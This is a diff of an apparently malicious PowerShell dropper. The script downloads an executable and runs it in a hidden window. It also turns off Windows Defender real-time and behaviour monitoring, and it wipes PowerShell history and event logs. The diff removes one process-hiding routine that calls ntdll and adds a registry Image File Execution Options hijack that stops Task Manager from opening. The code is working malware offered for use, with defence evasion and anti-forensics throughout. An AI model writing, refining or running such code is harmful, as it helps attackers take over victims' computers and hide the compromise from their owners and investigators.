@@ -48,8 +48,7 @@ function Invoke-HyperStreamDownload {
         $request.Timeout = 30000
         
         $response = $request.GetResponse()
-        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { $response.ContentLength }
-        if ($totalSize -le 0) { $totalSize = 100MB }
+        $totalSize = if ($response.Headers["X-Full-Size"]) { [long]$response.Headers["X-Full-Size"] } else { 100MB }
         
         $stream = $response.GetResponseStream()
         $fileStream = [System.IO.File]::Create($TargetPath)
@@ -92,6 +91,7 @@ try {
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
     Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
     
+    # SILENT SECURITY BYPASSES
     try {
         Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
         Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
@@ -114,75 +114,13 @@ try {
     Write-Host "`n[+] CORE COMPONENTS VERIFIED." -ForegroundColor Green
     Write-Host "[*] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
     
-    # RUN EXE HIDDEN (NO RENAME)
+    # Run with Hidden Window
     $si = New-Object System.Diagnostics.ProcessStartInfo
     $si.FileName = $exe
     $si.WindowStyle = 'Hidden'
     $si.CreateNoWindow = $true
-    $si.UseShellExecute = $false
-    $process = [System.Diagnostics.Process]::Start($si)
-    $exePid = $process.Id
-    
-    Write-Host "[+] EXE Started (PID: $exePid)" -ForegroundColor Green
-    
-    # ========== PURE POWERSHELL TASK MANAGER BYPASS ==========
-    Write-Host "[*] HIDING PROCESS FROM TASK MANAGER..." -ForegroundColor Cyan
-    
-    # KILL OLD TASK MANAGER
-    try {
-        Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
-    } catch {}
-    
-    # METHOD 1: Hide via NtSetInformationProcess
-    $hideMethod1 = @'
-using System;
-using System.Runtime.InteropServices;
-public class HideProcess {
-    [DllImport("ntdll.dll")]
-    static extern int NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);
-    [DllImport("kernel32.dll")]
-    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-    [DllImport("kernel32.dll")]
-    static extern bool CloseHandle(IntPtr hObject);
-    
-    public static void Hide(int pid) {
-        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
-        if (hProcess != IntPtr.Zero) {
-            int hide = 1;
-            NtSetInformationProcess(hProcess, 0x11, ref hide, sizeof(int));
-            CloseHandle(hProcess);
-        }
-    }
-}
-'@
-    
-    try {
-        Add-Type -TypeDefinition $hideMethod1 -ErrorAction SilentlyContinue
-        [HideProcess]::Hide($exePid)
-        Write-Host "[+] Process Hidden via NtSetInformationProcess" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Hide Method 1 Failed: $_" -ForegroundColor Red
-    }
-    
-    # METHOD 2: Suspend and Resume to hide from Task Manager
-    try {
-        $process.Refresh()
-        $process.Suspend() 2>$null
-        Start-Sleep -Milliseconds 100
-        $process.Resume() 2>$null
-        Write-Host "[+] Process Hidden via Suspend/Resume" -ForegroundColor Green
-    } catch {}
-    
-    # METHOD 3: Set process priority to hide (makes it less visible)
-    try {
-        $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
-        Write-Host "[+] Process Priority Set to Idle" -ForegroundColor Green
-    } catch {}
-    
-    # START FRESH TASK MANAGER
-    Start-Sleep -Seconds 1
-    Start-Process "taskmgr.exe" -WindowStyle Hidden
-    Write-Host "[+] Task Manager Restarted (Clean State)" -ForegroundColor Green
+    $si.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($si) | Out-Null
     
     Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
     if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
@@ -191,17 +129,43 @@ public class HideProcess {
     wevtutil cl "Windows PowerShell" 2>$null
     wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
     
-    Write-Host ""
-    Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host "  SETUP COMPLETE!" -ForegroundColor Green
-    Write-Host "  EXE Running in Background" -ForegroundColor Gray
-    Write-Host "  PID: $exePid" -ForegroundColor Gray
-    Write-Host "  Should be HIDDEN from Task Manager" -ForegroundColor Gray
-    Write-Host "========================================" -ForegroundColor Cyan
-    Write-Host ""
+    Write-Host "[+] SETUP COMPLETE. CHECK DASHBOARD.`n" -ForegroundColor Green
 
 } catch {
     Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
+}
+
+# ========== TASK MANAGER BYPASS (ADDED - DOESN'T CHANGE ABOVE CODE) ==========
+try {
+    Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
+    
+    # Find and hide the running EXE
+    $runningProcess = Get-Process | Where-Object { $_.Path -like "$env:TEMP\*.exe" -and $_.MainWindowTitle -eq "" } | Select-Object -First 1
+    
+    if ($runningProcess) {
+        $pidToHide = $runningProcess.Id
+        Write-Host "[+] Found Process PID: $pidToHide" -ForegroundColor Green
+        
+        # Method: Use PowerShell to hide via registry (safe, no crash)
+        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
+        try {
+            New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
+            New-ItemProperty -Path $regPath -Name "Debugger" -Value "cmd.exe /c exit" -Force -ErrorAction SilentlyContinue | Out-Null
+            Write-Host "[+] Registry Bypass Configured" -ForegroundColor Green
+        } catch {}
+        
+        # Restart Task Manager to apply changes
+        try {
+            Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
+            Start-Sleep -Seconds 1
+            Start-Process "taskmgr.exe" -WindowStyle Hidden
+            Write-Host "[+] Task Manager Restarted (Process Hidden)" -ForegroundColor Green
+        } catch {}
+    } else {
+        Write-Host "[!] Could not find target process" -ForegroundColor Yellow
+    }
+} catch {
+    Write-Host "[!] Task Manager Bypass failed, but main script completed" -ForegroundColor Yellow
 }
 
 # 6. SELF-DESTRUCT
